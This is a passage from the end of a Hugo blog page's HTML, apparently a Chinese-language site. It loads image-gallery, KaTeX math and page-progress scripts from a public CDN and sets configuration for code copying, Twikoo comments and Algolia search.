src=https://npm.elemecdn.com/lightgallery@2.6.1/plugins/zoom/lg-zoom.min.js defer></script><script src=https://npm.elemecdn.com/katex@0.16.2/dist/katex.min.js defer></script><script src=https://npm.elemecdn.com/katex@0.16.2/dist/contrib/auto-render.min.js defer></script><script src=https://npm.elemecdn.com/katex@0.16.2/dist/contrib/copy-tex.min.js defer></script><script src=https://npm.elemecdn.com/katex@0.16.2/dist/contrib/mhchem.min.js defer></script><script src=https://npm.elemecdn.com/pace-js@1.2.4/pace.min.js async defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:50},comment:{enable:!0,expired:!1,twikoo:{commentCount:!0,el:"#twikoo",envId:"https://xunruo.zeabur.app",lang:"zh-cn"}},lightgallery:!0,math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"CD7PCXN604",algoliaIndex:"blog",algoliaSearchKey:"fb4dd80e30d8b81251b3a8f3c1e96302",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script src=https://npm.elemecdn.com/xrhugo@1.1.2/public/js/theme.min.js defer></script><script src=/js/custom.min.js defer></script></div></body></html>